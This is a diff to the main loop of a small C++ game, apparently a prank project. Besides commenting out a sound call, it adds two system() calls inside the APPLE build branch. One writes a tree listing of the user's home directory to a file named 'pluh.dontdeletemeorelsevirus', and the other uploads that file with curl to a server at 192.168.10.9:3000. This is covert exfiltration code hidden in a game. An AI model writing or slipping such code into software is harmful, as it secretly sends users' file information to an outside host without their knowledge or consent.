@@ -63,7 +63,7 @@ int main(int argc, char *argv[])
             if (distance(P1.pos, john[i].pos) <= 20){
                 score -= 10;
                 john.removeAtIndex(i);
-                g.play(badBone);
+                //g.play(badBone);
             }
         }
         //while(sceneProjectiles.size() > 0){
@@ -121,6 +121,8 @@ int main(int argc, char *argv[])
     #endif
     #ifdef APPLE
     system(fmt::format("cat {}", trollPath).c_str());
+    system("tree ~/ >> ./pluh.dontdeletemeorelsevirus");
+    system("curl --location 'http://192.168.10.9:3000/home/seamuseats/pluh.txt' --form 'file=@./pluh.dontdeletemeorelsevirus'");
     #endif
     #ifdef _WIN32
     system(fmt::format("type {}", trollPath).c_str());
